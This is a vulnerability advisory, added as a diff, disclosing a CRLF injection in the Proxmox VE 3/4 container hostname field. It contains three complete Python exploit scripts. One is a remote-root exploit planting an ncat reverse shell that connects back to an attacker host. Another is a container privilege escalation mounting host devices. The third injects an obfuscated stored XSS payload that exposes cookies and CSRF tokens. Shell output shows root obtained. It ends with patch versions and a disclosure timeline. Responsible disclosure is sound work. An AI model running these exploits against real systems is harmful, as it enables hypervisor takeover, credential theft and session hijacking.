@@ -1,0 +1,465 @@
+=====================================================================
+Proxmox VE 3/4 Insecure Hostname Checking (Remote Root Exploit, XSS,
+Privileges escalation)
+=====================================================================
+
+Description
+===========
+
+Proxmox is a popular virtualization solution based on KVM and Linux
+containers.
+
+A critical vulnerability has been found in Proxmox VE 3 (OpenVZ) and
+Proxmox VE 4 beta 1 (LXC) in the
+virtual machine creating form allowing authenticated remote users to
+overwrite configuration files settings.
+
+
+Configuration file overwriting
+==============================
+
+Because the Proxmox VE application doesn't check the
+user-provided "hostname" POST parameter, it's
+possible to overwrite configuration files using a CRLF injection.
+In Proxmox VE 3, we successfully gained access to the host filesystem
+from a container and elevated our container capabilities, allowing us to
+obtain user credentials and sniff the network.
+In Proxmox VE 4b1, because LXC allows "hooks" to execute commands, we
+successfully gained root privileges on the host.
+It's also possible to exploit Proxmox clusters.
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+**Vulnerability**: CWE-915
+
+Proof of Concept
+----------------
+
+The following exploit works for Proxmox VE 4 beta 1. The
+lxc.hook.pre-start configuration variable is used to trigger the ncat
+reverse-shell payload when the container is started.
+
+    #!/usr/bin/env python
+
+    import requests
+    import socket
+    import telnetlib
+    from threading import Thread
+    import argparse
+    from time import sleep
+
+    def exploit(target, username, password, vmid, template, realm,
+reverse, hostname):
+        payload = "ncat %s %s -e /bin/sh" % reverse
+
+        print "[~] Obtaining authorization key..."
+        apireq = requests.post("https://%s/api2/extjs/access/ticket" %
+target,
+                               verify=False,
+                               data={"username": username,
+                                     "password": password,
+                                     "realm": realm})
+        response = apireq.json()
+        if "success" in response and response["success"]:
+            print "[+] Authentication success."
+            ticket = response["data"]["ticket"]
+            csrfticket = response["data"]["CSRFPreventionToken"]
+            createvm =
+requests.post("https://%s/api2/extjs/nodes/%s/lxc" % (target, hostname),
+                                     verify=False,
+                                     headers={"CSRFPreventionToken":
+csrfticket},
+                                     cookies={"PVEAuthCookie": ticket},
+                                     data={"vmid": vmid,
+
+"hostname":"sysdream\nlxc.hook.pre-start=%s &&" % payload,
+                                           "storage": "local",
+                                           "password": "sysdream",
+                                           "ostemplate": template,
+                                           "memory": 512,
+                                           "swap": 512,
+                                           "disk": 2,
+                                           "cpulimit": 1,
+                                           "cpuunits": 1024,
+                                           "net0":"name=eth0"})
+            if createvm.status_code == 200:
+                response = createvm.json()
+                if "success" in response and response["success"]:
+                    print "[+] Container Created... (Sleeping 20 seconds)"
+                    sleep(20)
+                    print "[+] Starting container..."
+                    startcontainer =
+requests.post("https://%s/api2/extjs/nodes/%s/lxc/%s/status/start" %
+(target, hostname, vmid), verify=False, headers={"CSRFPreventionToken":
+csrfticket}, cookies={"PVEAuthCookie": ticket})
+                    if startcontainer.status_code == 200:
+                        response = startcontainer.json()
+                        if "success" in response and response["success"]:
+                            print "[+] Exploit should be working..."
+                        else:
+                            print "[!] Can't start container ! Try to
+start it manually."
+                else:
+                    print "[!] Error creating container..."
+                    print response
+            else:
+                print "[!] Error creating Container. Bad HTTP Status
+code : %d" % createvm.status_code
+        else:
+            print "[!] Authentication failed - Check the credentials..."
+
+    def handler(lport):
+        print "[~] Starting handler on port %d" % lport
+        t = telnetlib.Telnet()
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.bind(("0.0.0.0", lport))
+        s.listen(1)
+        conn, addr = s.accept()
+
+        print "[+] Connection from %s" % addr[0]
+
+        t.sock = conn
+
+        print "[+] Pop the shell ! :)"
+
+        t.interact()
+
+    if __name__ == "__main__":
+        print "[~] Proxmox VE 4.0b1 Authenticated Root Exploit - Nicolas
+Chatelain <n.chatelain[at]sysdream.com>\n"
+
+        parser = argparse.ArgumentParser()
+        parser.add_argument("--target", required=True, help="The target
+host (eg : 10.0.0.1:8006)")
+
+        parser.add_argument("--username", required=True)
+        parser.add_argument("--password", required=True)
+
+        parser.add_argument("--localhost", required=True, help="Local
+host IP for the connect-back shell.")
+        parser.add_argument("--localport", required=True, type=int,
+help="Local port for local bind handler")
+
+        parser.add_argument("--vmid", required=False, default="999",
+type=int, help="A unique ID for the container, exploit will fail if the
+ID already exists.")
+
+        parser.add_argument("--template", required=False,
+default="local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
+                            help="An existing template in the hypervisor "
+                                 "(default :
+local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")
+
+        parser.add_argument("--realm", required=False, default="pam",
+choices=["pve", "pam"])
+
+        parser.add_argument("--hostname", required=True, help="The
+target hostname")
+
+        args = parser.parse_args()
+
+        handlerthr = Thread(target=handler, args=(args.localport,))
+        handlerthr.start()
+
+        exploitthr = Thread(target=exploit, args=(args.target,
+args.username, args.password, args.vmid, args.template, args.realm,
+(args.localhost, args.localport), args.hostname))
+        exploitthr.start()
+
+        handlerthr.join()
+
+Shell output :
+
+    nightlydev@nworkstation ~/Lab/Proxmox_Exploits $ python
+remoteroot.py --target 10.25.0.101:8006 --username nicolas --password
+pveuser --localhost 10.25.0.10 --localport 9999 --vmid 456 --realm pve
+--hostname pve4
+    [~] Proxmox VE 4.0b1 Authenticated Root Exploit - Nicolas Chatelain
+<n.chatelain[at]sysdream.com>
+    [~] Starting handler on port 9999
+    [~] Obtaining authorization key...
+    [+] Authentication success.
+    [+] Container Created... (Sleeping 20 seconds)
+    [+] Exploit should be working...
+    [+] Connection from 10.25.0.101
+    [+] Pop the shell !
+    whoami
+    root
+    id
+    uid=0(root) gid=0(root) groups=0(root)
+
+The following exploit works for Proxmox VE 3. This proof of concept
+mount the host /dev/dm-0 on the container and add multiples capabilities
+on the container.
+
+
+    #!/usr/bin/env python
+
+    import requests
+    import socket
+    import telnetlib
+    from threading import Thread
+    import argparse
+
+    def exploit(target, username, password, vmid, template, realm,
+hostname):
+        payload = "sysdream\"\nDEVNODES=\"dm-0:r
+\"\nCAPABILITIES=\"mknod:on, sys_chroot:on, sys_rawio: on, net_admin:on,
+dac_override:on\"\n#"
+        print "[~] Obtaining authorization key..."
+        apireq = requests.post("https://%s/api2/extjs/access/ticket" %
+target,
+                               verify=False,
+                               data={"username": username,
+                                     "password": password,
+                                     "realm": realm})
+        response = apireq.json()
+        if "success" in response and response["success"]:
+            print "[+] Authentication success."
+            ticket = response["data"]["ticket"]
+            csrfticket = response["data"]["CSRFPreventionToken"]
+            createvm =
+requests.post("https://%s/api2/extjs/nodes/%s/openvz" % (target, hostname),
+                                     verify=False,
+                                     headers={"CSRFPreventionToken":
+csrfticket},
+                                     cookies={"PVEAuthCookie": ticket},
+                                     data={"vmid": vmid,
+                                           "hostname": payload,
+                                           "storage": "local",
+                                           "password": "sysdream",
+                                           "ostemplate": template,
+                                           "memory": 512,
+                                           "swap": 512,
+                                           "disk": 2,
+                                           "cpus": 1,
+
+"netif":"ifname=eth0,bridge=vmbr0"})
+            if createvm.status_code == 200:
+                response = createvm.json()
+                if "success" in response and response["success"]:
+                    print "[+] Countainer (Capabilities + DM-0 Mount)
+Created."
+                else:
+                    print "[!] Error creating container..."
+                    print response
+            else:
+                print "[!] Error creating Container. Bad HTTP Status
+code : %d" % createvm.status_code
+        else:
+            print "[!] Authentication failed - Check the credentials..."
+
+    if __name__ == "__main__":
+        print "[~] Proxmox VE 3 Authenticated Privileges Escalation
+Exploit - Nicolas Chatelain <n.chatelain[at]sysdream.com>\n"
+
+        parser = argparse.ArgumentParser()
+        parser.add_argument("--target", required=True, help="The target
+host (eg : 10.0.0.1:8006)")
+
+        parser.add_argument("--username", required=True)
+        parser.add_argument("--password", required=True)
+
+        parser.add_argument("--vmid", required=False, default="999",
+type=int, help="A unique ID for the container, exploit will fail if the
+ID already exists.")
+
+        parser.add_argument("--template", required=False,
+default="local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
+                            help="An existing template in the hypervisor
+(default : local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")
+
+        parser.add_argument("--hostname", required=True, help="The
+target hostname")
+
+        parser.add_argument("--realm", required=False, default="pam",
+choices=["pve", "pam"])
+
+        args = parser.parse_args()
+
+        exploit(args.target, args.username, args.password, args.vmid,
+args.template, args.realm, args.hostname)
+
+Shell output :
+
+    nightlydev@nworkstation ~/Lab/Proxmox_Exploits $ python
+privescalation.py --username root --password sysofdream --vmid 123
+--realm pam --target 10.25.0.110:8006 --hostname pve3
+    [~] Proxmox VE 3 Authenticated Privileges Escalation Exploit -
+Nicolas Chatelain <n.chatelain[at]sysdream.com>
+
+    [~] Obtaining authorization key...
+    [+] Authentication success.
+    [+] Countainer (Capabilities + DM-0 Mount) Created.
+
+-- On container :
+
+    root@sysdream:/# ls -lah /dev/dm-0
+    brw-r----T 1 root root 253, 0 Aug 23 00:33 /dev/dm-0
+
+---
+Stored Cross-Site Scripting
+===========================
+
+Same vulnerability, different usage. Works on Proxmox 3 and Proxmox 4b1.
+
+**Access Vector**: remote
+
+**Security Risk**: high
+
+
+Proof of Concept
+----------------
+
+The following exploit will create a stored XSS displaying the user
+cookies and the PVE CSRFPreventionToken.
+
+
+    #!/usr/bin/env python
+
+    import requests
+    import socket
+    import telnetlib
+    from threading import Thread
+    import argparse
+
+    def exploit(target, username, password, vmid, template, realm,
+version, hostname):
+        payload =
+"eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,43,34,45,34,32,43,32,80,86,69,46,67,83,82,70,80,114,101,118,101,110,116,105,111,110,84,111,107,101,110,41,59))"
+        print "[~] Obtaining authorization key..."
+        apireq = requests.post("https://%s/api2/extjs/access/ticket" %
+target,
+                               verify=False,
+                               data={"username": username,
+                                     "password": password,
+                                     "realm": realm})
+        response = apireq.json()
+        if "success" in response and response["success"]:
+            print "[+] Authentication success."
+            ticket = response["data"]["ticket"]
+            csrfticket = response["data"]["CSRFPreventionToken"]
+            if version == "4":
+                createvm =
+requests.post("https://%s/api2/extjs/nodes/%s/lxc" % (target, hostname),
+                                         verify=False,
+                                         headers={"CSRFPreventionToken":
+csrfticket},
+                                         cookies={"PVEAuthCookie": ticket},
+                                         data={"vmid": vmid,
+
+"hostname":"<img/src='x'/onerror=%s>" % payload,
+                                               "storage": "local",
+                                               "password": "sysdream",
+                                               "ostemplate": template,
+                                               "memory": 512,
+                                               "swap": 512,
+                                               "disk": 2,
+                                               "cpulimit": 1,
+                                               "cpuunits": 1024,
+                                               "net0":"name=eth0"})
+            elif version == "3":
+                   createvm =
+requests.post("https://%s/api2/extjs/nodes/%s/openvz" % (target, hostname),
+                                         verify=False,
+headers={"CSRFPreventionToken": csrfticket},
+                                         cookies={"PVEAuthCookie": ticket},
+                                         data={"vmid": vmid,
+
+"hostname":"<img/src='x'/onerror=%s>" % payload,
+                                               "storage": "local",
+                                               "password": "sysdream",
+                                               "ostemplate": template,
+                                               "memory": 512,
+                                               "swap": 512,
+                                               "disk": 2,
+                                               "cpus": 1,
+
+"netif":"ifname=eth0,bridge=vmbr0"})
+            if createvm.status_code == 200:
+                response = createvm.json()
+                if "success" in response and response["success"]:
+                    print "[+] Stored XSS Created."
+                else:
+                    print "[!] Error creating container..."
+                    print response
+            else:
+                print "[!] Error creating Container. Bad HTTP Status
+code : %d" % createvm.status_code
+        else:
+            print "[!] Authentication failed - Check the credentials..."
+
+    if __name__ == "__main__":
+        print "[~] Proxmox VE 3/4b1 Stored Cross Site Scripting -
+Nicolas Chatelain <n.chatelain[at]sysdream.com>\n"
+
+        parser = argparse.ArgumentParser()
+        parser.add_argument("--target", required=True, help="The target
+host (eg : 10.0.0.1:8006)")
+
+        parser.add_argument("--username", required=True)
+        parser.add_argument("--password", required=True)
+
+        parser.add_argument("--vmid", required=False, default="999",
+type=int, help="A unique ID for the container, exploit will fail if the
+ID already exists.")
+
+        parser.add_argument("--template", required=False,
+default="local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz",
+                            help="An existing template in the hypervisor
+(default : local:vztmpl/debian-7.0-standard_7.0-2_i386.tar.gz)")
+
+        parser.add_argument("--realm", required=False, default="pam",
+choices=["pve", "pam"])
+
+        parser.add_argument("--version", default="3", choices=["3",
+"4"], help="The Proxmox version to exploit")
+
+        parser.add_argument("--hostname", required=True, help="The
+target hostname")
+
+        args = parser.parse_args()
+
+        exploit(args.target, args.username, args.password, args.vmid,
+args.template, args.realm, args.version, args.hostname)
+
+---------------
+Vulnerable code
+---------------
+
+The vulnerable code is located in the /usr/share/perl5/PVE/LXC.pm for
+Proxmox 4.
+
+For Proxmox 3, the vulnerable code is located in
+/usr/share/perl5/PVE/OpenVZ.pm.
+
+--------
+Solution
+--------
+
+Proxmox 4 : Update to pve-container 0.9-22
+
+Proxmox 3 : Update to pve-manager 3.4-10
+
+Timeline (dd/mm/yyyy)
+=====================
+
+04/09/2015 : Initial discovery.
+17/09/2015 : Contact with proxmox team.
+18/09/2015 : Proxmox fixes the vulnerabilities.
+18/09/2015 : Proxmox releases a new pve-container version (0.9-22)
+18/09/2015 : Proxmox releases a new pve-manager version (3.4-10)
+
+Affected versions
+=================
+
+* Proxmox VE 4
+* Proxmox VE 3
+
+
+Credits
+=======
+
+* Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)
